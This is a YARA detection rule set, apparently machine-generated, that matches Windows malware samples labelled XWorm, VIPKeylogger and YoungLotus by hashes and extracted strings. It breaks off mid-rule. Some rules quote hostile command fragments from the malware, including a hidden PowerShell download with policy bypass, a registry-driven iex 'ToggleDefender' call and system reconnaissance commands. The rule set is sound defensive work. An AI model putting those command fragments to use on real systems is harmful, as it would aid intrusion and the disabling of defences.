/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-10
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule YoungLotus_signature__9b201090749bae06a761156dbad9c4f1_imphash_ {
   meta:
      description = "_subset_batch - file YoungLotus(signature)_9b201090749bae06a761156dbad9c4f1(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "013459242cd47dfb0d484ea5a5731e9f3f62dd0a9f625835a4e98ceb81b3caf9"
   strings:
      $x1 = "ComSpec=C:\\Windows\\system32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $x2 = "C:\\Windows\\system32\\rsaenh.dll" fullword wide /* score: '34.00'*/
      $x3 = "APPDATA=C:\\Users\\Administrator\\AppData\\Roaming" fullword ascii /* score: '31.00'*/
      $s4 = "TEMP=C:\\Users\\ADMINI~1\\AppData\\Local\\Temp" fullword ascii /* score: '27.00'*/
      $s5 = "TMP=C:\\Users\\ADMINI~1\\AppData\\Local\\Temp" fullword ascii /* score: '27.00'*/
      $s6 = "C:\\Windows\\SysWOW64\\cryptnet.dll" fullword wide /* score: '26.00'*/
      $s7 = "USERPROFILE=C:\\Users\\Administrator" fullword ascii /* score: '21.00'*/
      $s8 = "OneDrive=C:\\Users\\Administrator\\OneDrive" fullword ascii /* score: '21.00'*/
      $s9 = "http://ocsp.digicert.com" fullword wide /* score: '21.00'*/
      $s10 = "ocsp:http://ocsp.digicert.com" fullword wide /* score: '21.00'*/
      $s11 = "PSModulePath=C:\\Program Files\\WindowsPowerShell\\Modules;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules" fullword ascii /* score: '20.00'*/
      $s12 = "4http://www.microsoft.com/pkiops/Docs/Repository.htm" fullword ascii /* score: '17.00'*/
      $s13 = "PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC" fullword ascii /* score: '16.00'*/
      $s14 = "CommonProgramFiles(x86)=C:\\Program Files (x86)\\Common Files" fullword ascii /* score: '13.00'*/
      $s15 = "Bhttp://www.microsoft.com/pkiops/crl/MicSecSerCA2011_2011-10-18.crl0`" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      1 of ($x*) and 4 of them
}

rule VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2fd66245 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2fd66245.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2fd66245852c8e1c7c5aa9354e333c4af0e05804ffccf349981286b7bb23abfb"
   strings:
      $x1 = "FieldInsightMobile.NaturalSpacePreservation+VB$StateMachine_135_ProcessStationDataAsync, FieldInsightMobile, Version=3.0.2.0, Cu" ascii /* score: '32.00'*/
      $s2 = "FieldInsightMobile.NaturalSpacePreservation+VB$StateMachine_134_MonitorEcosystemHealthAsync, FieldInsightMobile, Version=3.0.2.0" ascii /* score: '27.00'*/
      $s3 = "FieldInsightMobile.NaturalSpacePreservation+VB$StateMachine_135_ProcessStationDataAsync, FieldInsightMobile, Version=3.0.2.0, Cu" ascii /* score: '26.00'*/
      $s4 = "NOTICE: Elevated temperature detected" fullword wide /* score: '23.00'*/
      $s5 = "ExecuteOperation" fullword wide /* score: '23.00'*/
      $s6 = " - Elevation change" fullword wide /* score: '20.00'*/
      $s7 = "ERROR: Safety checks failed - autonomous operation aborted" fullword wide /* score: '20.00'*/
      $s8 = "Process is not capable - requires improvement" fullword wide /* score: '19.00'*/
      $s9 = "FieldInsightMobile.NaturalSpacePreservation+VB$StateMachine_134_MonitorEcosystemHealthAsync, FieldInsightMobile, Version=3.0.2.0" ascii /* score: '18.00'*/
      $s10 = "INSERT INTO activity_logs (user_id, action_description) VALUES ({0}, '{1}')" fullword wide /* score: '18.00'*/
      $s11 = "SELECT u.username AS 'User', CONCAT(u.first_name, ' ', u.last_name) AS 'Full Name', al.action_description AS 'Action', al.log_ti" wide /* score: '18.00'*/
      $s12 = "_TargetEcosystem" fullword ascii /* score: '17.00'*/
      $s13 = "Roughing passes executed: " fullword wide /* score: '17.00'*/
      $s14 = "Finishing passes executed" fullword wide /* score: '17.00'*/
      $s15 = "SELECT u.user_id, CONCAT(u.first_name, ' ', u.last_name, ' (', u.username, ')', CASE WHEN b.status = 'Approved' THEN ' - Occupie" wide /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__a1118d70a409ac804b8ebec7a9ceb788_imphash_ {
   meta:
      description = "_subset_batch - file XWorm(signature)_a1118d70a409ac804b8ebec7a9ceb788(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0c46c44dd8d89f114c6efaa6cf6f5303884f9509f8744804d29f09e74953dcf1"
   strings:
      $s1 = "Alt+ Clipboard does not support Icons/Menu '%s' is already being used by another formDocked control must have a name%Error remo" wide /* score: '16.00'*/
      $s2 = "clWebDarkMagenta" fullword ascii /* score: '14.00'*/
      $s3 = "Stream write error\"Unable to find a Table of Contents" fullword wide /* score: '14.00'*/
      $s4 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes" fullword ascii /* score: '12.00'*/
      $s5 = "4d4P4>3" fullword ascii /* reversed goodware string '3>4P4d4' */ /* score: '11.00'*/
      $s6 = "0O0H0C0" fullword ascii /* reversed goodware string '0C0H0O0' */ /* score: '11.00'*/
      $s7 = "3w3P3'2" fullword ascii /* reversed goodware string '2'3P3w3' */ /* score: '11.00'*/
      $s8 = ".-,+*)('&%" fullword ascii /* reversed goodware string '%&'()*+,-.' */ /* score: '11.00'*/
      $s9 = "1p1i1@1" fullword ascii /* reversed goodware string '1@1i1p1' */ /* score: '11.00'*/
      $s10 = "1x1f1R1" fullword ascii /* reversed goodware string '1R1f1x1' */ /* score: '11.00'*/
      $s11 = "evalcomp" fullword ascii /* score: '11.00'*/
      $s12 = "\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\" fullword ascii /* score: '11.00'*/
      $s13 = "4l4P494" fullword ascii /* reversed goodware string '494P4l4' */ /* score: '11.00'*/
      $s14 = "*y*q*i*a*Y*Q*I*A*9*1*)*!*" fullword ascii /* reversed goodware string '*!*)*1*9*A*I*Q*Y*a*i*q*y*' */ /* score: '11.00'*/
      $s15 = "0a0Z050" fullword ascii /* reversed goodware string '050Z0a0' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule XWorm_signature_ {
   meta:
      description = "_subset_batch - file XWorm(signature).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8d1523bbaf9cccd544215c1dec33d97aa6cd4273dc4bb6469823c1385626d233"
   strings:
      $s1 = "NativeEncoderx86.dll" fullword ascii /* score: '23.00'*/
      $s2 = "NativeEncoderx64.dll" fullword ascii /* score: '23.00'*/
      $s3 = "Runtime Broker.exe" fullword wide /* score: '22.00'*/
      $s4 = "UnVudGltZSBCcm9rZXIuZXhlfFRydWV8RmFsc2V8VHJ1ZXwlV2luRGlyJVxTeXN0ZW0zMnxUcnVlfEZhbHNlfEZhbHNl" fullword wide /* base64 encoded string  */ /* score: '14.00'*/
      $s5 = "dVV1SmhucnpjcUMyTFNieGI=" fullword wide /* base64 encoded string */ /* score: '14.00'*/
      $s6 = "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcQWR2YW5jZWQ=" fullword wide /* base64 encoded string*/ /* score: '14.00'*/
      $s7 = "U2hvd1N1cGVySGlkZGVu" fullword wide /* base64 encoded string */ /* score: '14.00'*/
      $s8 = "JUN1cnJlbnQl" fullword wide /* base64 encoded string */ /* score: '14.00'*/
      $s9 = "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu" fullword wide /* base64 encoded string */ /* score: '14.00'*/
      $s10 = "U2VsZWN0ICogZnJvbSBXaW4zMl9Db21wdXRlclN5c3RlbQ==" fullword wide /* base64 encoded string  */ /* score: '14.00'*/
      $s11 = "TWFudWZhY3R1cmVy" fullword wide /* base64 encoded string  */ /* score: '14.00'*/
      $s12 = "bWljcm9zb2Z0IGNvcnBvcmF0aW9u" fullword wide /* base64 encoded string  */ /* score: '14.00'*/
      $s13 = "VklSVFVBTA==" fullword wide /* base64 encoded string */ /* score: '14.00'*/
      $s14 = "VmlydHVhbEJveA==" fullword wide /* base64 encoded string*/ /* score: '14.00'*/
      $s15 = "U2JpZURsbC5kbGw=" fullword wide /* base64 encoded string  */ /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule XWorm_signature__112bfbb18727302cb5425c20a464b02e_imphash__0d648574 {
   meta:
      description = "_subset_batch - file XWorm(signature)_112bfbb18727302cb5425c20a464b02e(imphash)_0d648574.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0d64857444ac3bef48601ae41ffc4bc495a2827a5357b37d8ac8632e06194550"
   strings:
      $s1 = "c:\\re\\workspace\\8-2-build-windows-amd64-cygwin\\jdk8u144\\9417\\build\\windows-amd64\\deploy\\tmp\\jp2launcher\\obj64\\jp2lau" ascii /* score: '23.00'*/
      $s2 = "%s\\bin\\javaw.exe" fullword ascii /* score: '20.00'*/
      $s3 = "-theThing.exe" fullword ascii /* score: '19.00'*/
      $s4 = "JavaDeployReg.log" fullword ascii /* score: '19.00'*/
      $s5 = "  <!-- Indicate this JDK version is Windows 7 compatible -->" fullword ascii /* score: '19.00'*/
      $s6 = "Error:%08x in SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath)" fullword ascii /* score: '19.00'*/
      $s7 = " com.sun.deploy.panel.ControlPanel -userConfig \"" fullword ascii /* score: '17.00'*/
      $s8 = "D$X.exe" fullword ascii /* score: '16.00'*/
      $s9 = "  <!-- Identify the application security requirements. -->" fullword ascii /* score: '16.00'*/
      $s10 = "        <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s11 = "-XX:-TransmitErrorReport" fullword ascii /* score: '10.00'*/
      $s12 = "                processorArchitecture=\"*\"" fullword ascii /* score: '10.00'*/
      $s13 = "     processorArchitecture=\"X86\"" fullword ascii /* score: '10.00'*/
      $s14 = "  <description>Java SE Launcher for Java Plug-In.</description> " fullword ascii /* score: '10.00'*/
      $s15 = "Syka blyat. Fuck all. Made in Russia. Neshta_v3" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule XWorm_signature__112bfbb18727302cb5425c20a464b02e_imphash_ {
   meta:
      description = "_subset_batch - file XWorm(signature)_112bfbb18727302cb5425c20a464b02e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a95536980e65e1af4146ab9efc02145ef24b3efe4935d6b65a5c4631ab77b77c"
   strings:
      $s1 = "        <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"" ascii /* score: '27.00'*/
      $s2 = "c:\\re\\workspace\\8-2-build-windows-amd64-cygwin\\jdk8u144\\9417\\build\\windows-amd64\\jdk\\objs\\keytool_objs\\keytool.pdb" fullword ascii /* score: '23.00'*/
      $s3 = "<assemblyIdentity version=\"8.0.144.1\" processorArchitecture=\"X86\" name=\"Oracle Corporation, Java(tm) 2 Standard Edition\" t" ascii /* score: '21.00'*/
      $s4 = "        <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"" ascii /* score: '21.00'*/
      $s5 = "<assemblyIdentity version=\"8.0.144.1\" processorArchitecture=\"X86\" name=\"Oracle Corporation, Java(tm) 2 Standard Edition\" t" ascii /* score: '21.00'*/
      $s6 = "-theThing.exe" fullword ascii /* score: '19.00'*/
      $s7 = "D$X.exe" fullword ascii /* score: '16.00'*/
      $s8 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s9 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s10 = "Syka blyat. Fuck all. Made in Russia. Neshta_v3" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule XWorm_signature__112bfbb18727302cb5425c20a464b02e_imphash__b0f3e4ec {
   meta:
      description = "_subset_batch - file XWorm(signature)_112bfbb18727302cb5425c20a464b02e(imphash)_b0f3e4ec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b0f3e4ec9b502acb2cb05ba9427d74e5368e0d2600540a1b8eb639e8caf15fe8"
   strings:
      $s1 = "        <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"" ascii /* score: '27.00'*/
      $s2 = "<assemblyIdentity version=\"8.0.144.1\" processorArchitecture=\"X86\" name=\"Oracle Corporation, Java(tm) 2 Standard Edition\" t" ascii /* score: '21.00'*/
      $s3 = "        <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"" ascii /* score: '21.00'*/
      $s4 = "<assemblyIdentity version=\"8.0.144.1\" processorArchitecture=\"X86\" name=\"Oracle Corporation, Java(tm) 2 Standard Edition\" t" ascii /* score: '21.00'*/
      $s5 = "c:\\re\\workspace\\8-2-build-windows-amd64-cygwin\\jdk8u144\\9417\\build\\windows-amd64\\jdk\\objs\\javaw_objs\\javaw.pdb" fullword ascii /* score: '20.00'*/
      $s6 = "-theThing.exe" fullword ascii /* score: '19.00'*/
      $s7 = "D$X.exe" fullword ascii /* score: '16.00'*/
      $s8 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s9 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s10 = "Syka blyat. Fuck all. Made in Russia. Neshta_v3" fullword ascii /* score: '9.00'*/
      $s11 = "i\\Syka blyat. Fuck all. Made in Russia. Neshta_v3" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule XWorm_signature__40ab50289f7ef5fae60801f88d4541fc_imphash_ {
   meta:
      description = "_subset_batch - file XWorm(signature)_40ab50289f7ef5fae60801f88d4541fc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4a15566464dc35025c1732e8af6c5f85043c7adaee962d07c51a8b819e8c1bdb"
   strings:
      $x1 = "<file name=\"version.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x2 = "<file name=\"comctl32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x3 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $s4 = "<file name=\"netutils.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s5 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s6 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s7 = "<file name=\"mpr.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s8 = "FHeaderProcessed" fullword ascii /* score: '20.00'*/
      $s9 = "FExecuteAfterTimestamp" fullword ascii /* score: '18.00'*/
      $s10 = "OnExecutexAF" fullword ascii /* score: '18.00'*/
      $s11 = "For more detailed information, please visit https://jrsoftware.org/ishelp/index.php?topic=setupcmdline" fullword wide /* score: '18.00'*/
      $s12 = "7VAR and OUT arguments must match parameter type exactly\"%s (Version %d.%d, Build %d, %5:s):%s Service Pack %4:d (Version %1:d." wide /* score: '15.50'*/
      $s13 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s14 = "TComponent.GetObservers$ActRec" fullword ascii /* score: '15.00'*/
      $s15 = "BTDictionary<System.string,System.TypInfo.PTypeInfo>.TKeyEnumeratord" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__af1abd42 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_af1abd42.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "af1abd42b66dc0ed8e27db626f60c1c57c3e424e67740c8fc537275e30cd2980"
   strings:
      $x1 = "powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebCli" wide /* score: '51.00'*/
      $x2 = "echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environ" wide /* score: '50.00'*/
      $x3 = "C:\\Users\\NEMESIS\\Desktop\\BigEye Final_2025_05_27 Fixed Scale\\BigEye Final_2025_05_27 Fixed Scale\\HVNCDll\\obj\\Release\\hv" ascii /* score: '39.00'*/
      $x4 = "ExecutionPolicy Bypass Start-Process -FilePath '\"" fullword wide /* score: '39.00'*/
      $x5 = "System.Data.SQLite.SEE.License, Version=1.0.115.5, Culture=neutral, PublicKeyToken={0}, processorArchitecture=MSIL" fullword wide /* score: '39.00'*/
      $x6 = "Microsoft.VSDesigner.Data.Design.DBCommandEditor, Microsoft.VSDesigner, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7" ascii /* score: '36.00'*/
      $x7 = "Microsoft.VSDesigner.Data.SQL.Design.SqlCommandTextEditor, Microsoft.VSDesigner, Version=8.0.0.0, Culture=neutral, PublicKeyToke" ascii /* score: '36.00'*/
      $x8 = "$script+=';iex((gp Registry::HKEY_Users\\S-1-5-21*\\Volatile* ToggleDefender -ea 0)[0].ToggleDefender)}'; $cmd='powershell '+$sc" ascii /* score: '34.00'*/
      $x9 = "$script+=';iex((gp Registry::HKEY_Users\\S-1-5-21*\\Volatile* ToggleDefender -ea 0)[0].ToggleDefender)}'; $cmd='powershell '+$sc" ascii /* score: '34.00'*/
      $x10 = "cmd.exe /k START " fullword wide /* score: '33.00'*/
      $x11 = "ProcessHacker.exe" fullword wide /* score: '33.00'*/
      $x12 = "C:\\Users\\NEMESIS\\Desktop\\BigEye Final_2025_05_27 Fixed Scale\\BigEye Final_2025_05_27 Fixed Scale\\Client\\Resources\\Scale." ascii /* score: '32.00'*/
      $x13 = "jSystem.CodeDom.MemberAttributes, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size," ascii /* score: '32.00'*/
      $x14 = "C:\\Temp\\1.log" fullword wide /* score: '32.00'*/
      $x15 = "C:\\Temp\\client.log" fullword wide /* score: '32.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      10 of ($x*)
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__68a36788 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_68a36788.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "68a367884639037f1e1e7619df3ae3fcc6177034e8bd3d0da2f62383762b3dc8"
   strings:
      $x1 = "DownloaderApp.exe" fullword wide /* score: '37.00'*/
      $x2 = "hater/nircmd.exe" fullword ascii /* score: '36.00'*/
      $x3 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $x4 = "srvcli.dll" fullword wide /* reversed goodware string 'lld.ilcvrs' */ /* score: '33.00'*/
      $x5 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x6 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x7 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x8 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $s9 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s10 = "questedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\"><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" /><" ascii /* score: '26.00'*/
      $s11 = "SSPICLI.DLL" fullword wide /* score: '23.00'*/
      $s12 = "UXTheme.dll" fullword wide /* score: '23.00'*/
      $s13 = "oleaccrc.dll" fullword wide /* score: '23.00'*/
      $s14 = "dnsapi.DLL" fullword wide /* score: '23.00'*/
      $s15 = "iphlpapi.DLL" fullword wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*) and all of them
}

rule XWorm_signature__db3d5485 {
   meta:
      description = "_subset_batch - file XWorm(signature)_db3d5485.xls"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "db3d5485bd01d0d3adbaa2c3f4fd99e220dadd6c0aa9287009ca8e3ae466eec7"
   strings:
      $x1 = "Do you have a closed loop process monitoring system to monitor process variation, such as injection pressure, temperature etc.?J" ascii /* score: '35.00'*/
      $s2 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.4#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE12\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s3 = "Are in-process and in- store material and FG properly identified and controlled?X" fullword ascii /* score: '22.00'*/
      $s4 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applicat" wide /* score: '21.00'*/
      $s5 = "How is the arrangement for incapable processes or machines targeted for improvement or replacement? M" fullword ascii /* score: '21.00'*/
      $s6 = "How well is the capability of critical processes and machines measured been monitored with Cpk's > 1.33, and target at 2.0?d" fullword ascii /* score: '21.00'*/
      $s7 = "Are in process inspections, test operations, and processes properly specified and performed?n" fullword ascii /* score: '20.00'*/
      $s8 = "To what extent are process controls part of the standard operating procedure?g" fullword ascii /* score: '20.00'*/
      $s9 = "Are environmental controls in place for process and materials that can be affected by controllable factor? i.e.: temperature, hu" ascii /* score: '18.00'*/
      $s10 = "Are environmental controls in place for process and materials that can be affected by controllable factor? i.e.: temperature, hu" ascii /* score: '18.00'*/
      $s11 = "To what extent are manufacturing products, processes, and configuration document under issue control; and meet the design specif" ascii /* score: '18.00'*/
      $s12 = "Do you have a closed loop process for line rejections?)" fullword ascii /* score: '18.00'*/
      $s13 = "*\\G{00020813-0000-0000-C000-000000000046}#1.6#0#C:\\Program Files (x86)\\Microsoft Office\\Office12\\EXCEL.EXE#Microsoft Excel " wide /* score: '17.00'*/
      $s14 = "Are the \"Quality Target\" stated, and understand throughout the company?;" fullword ascii /* score: '17.00'*/
      $s15 = "In Process Quality Control" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__112bfbb18727302cb5425c20a464b02e_imphash__eec619b3 {
   meta:
      description = "_subset_batch - file XWorm(signature)_112bfbb18727302cb5425c20a464b02e(imphash)_eec619b3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eec619b31c20b98b265f97f8ed2b8ece9fa819237a80d19a6504f7f7b247c500"
   strings:
      $s1 = "D:\\T\\BuildResults\\bin\\Release_x64\\WCChromeNativeMessagingHost.pdb" fullword ascii /* score: '27.00'*/
      $s2 = "WCChromeNativeMessagingHost.exe" fullword wide /* score: '27.00'*/
      $s3 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s4 = "Browser\\WCFirefoxExtn\\components\\WCFirefoxExtn.dll" fullword wide /* score: '23.00'*/
      $s5 = "msedge.exe" fullword wide /* score: '22.00'*/
      $s6 = "-theThing.exe" fullword ascii /* score: '19.00'*/
      $s7 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\AcroRd32.exe" fullword wide /* score: '18.00'*/
      $s8 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Acrobat.exe" fullword wide /* score: '18.00'*/
      $s9 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
      $s10 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii /* score: '16.00'*/
      $s11 = "4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0" fullword ascii /* score: '16.00'*/
      $s12 = "7http://cacerts.digicert.com/DigiCertAssuredIDRootCA.crt0E" fullword ascii /* score: '16.00'*/
      $s13 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii /* score: '16.00'*/
      $s14 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0 " fullword ascii /* score: '16.00'*/
      $s15 = "D$X.exe" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__991bd9d4 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_991bd9d4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "991bd9d46638c63008b295b2041044ccbf242aa38f8750f4e5c31b0e16a0e541"
   strings:
      $s1 = "ObfuX.Dyn.Runtime.dll" fullword wide /* score: '26.00'*/
      $s2 = "NativeEncoderx86.dll" fullword ascii /* score: '23.00'*/
      $s3 = "NativeEncoderx64.dll" fullword ascii /* score: '23.00'*/
      $s4 = "GooglexChrome.exe" fullword wide /* score: '22.00'*/
      $s5 = "0x7RT.dll" fullword wide /* score: '20.00'*/
      $s6 = "APELA X PNL.exe" fullword wide /* score: '19.00'*/
      $s7 = "APELA X PNL BACKK.exe" fullword wide /* score: '19.00'*/
      $s8 = "processExceptionHandler" fullword ascii /* score: '15.00'*/
      $s9 = "XorProcess" fullword ascii /* score: '15.00'*/
      $s10 = "Xenocode.Client.Attributes.AssemblyAttributes.ProcessedByXenocode" fullword ascii /* score: '14.00'*/
      $s11 = "ShortInlineBrTargetEmitter" fullword ascii /* score: '14.00'*/
      $s12 = "Runtime.Xor" fullword ascii /* score: '13.00'*/
      $s13 = "ObfuX.Dyn.Runtime" fullword wide /* score: '13.00'*/
      $s14 = "getEngineVersion" fullword ascii /* score: '12.00'*/
      $s15 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b0419955 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b0419955.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b0419955fb3d6e0e0da21a87aa0d1ee1b8aa3818c1f28bb9003273b0ec7cda5a"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\JNXAaSaOSI\\src\\obj\\Debug\\xpKX.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "System.Windows.Forms.HorizontalAlignment, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e08" ascii /* score: '27.00'*/
      $s3 = "System.Windows.Forms.LeftRightAlignment, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" ascii /* score: '27.00'*/
      $s4 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s5 = "xpKX.exe" fullword wide /* score: '22.00'*/
      $s6 = "Vip.CustomForm.Images.SystemButtons.bmp" fullword wide /* score: '17.00'*/
      $s7 = "SSH, Telnet and Rlogin client" fullword ascii /* score: '15.00'*/
      $s8 = "m_systemCommands" fullword ascii /* score: '15.00'*/
      $s9 = "GetButtonCommand" fullword ascii /* score: '12.00'*/
      $s10 = "get_FrameLayout" fullword ascii /* score: '12.00'*/
      $s11 = "OnWmSysCommand" fullword ascii /* score: '12.00'*/
      $s12 = "-Gets or Set Value to Drop Shadow to the form." fullword ascii /* score: '11.00'*/
      $s13 = "3https://www.chiark.greenend.org.uk/~sgtatham/putty/0" fullword ascii /* score: '10.00'*/
      $s14 = "get_HighlightedButton" fullword ascii /* score: '9.00'*/
      $s15 = "*Gets or sets the font of the form's title." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8fa6a5b3 {
   meta:
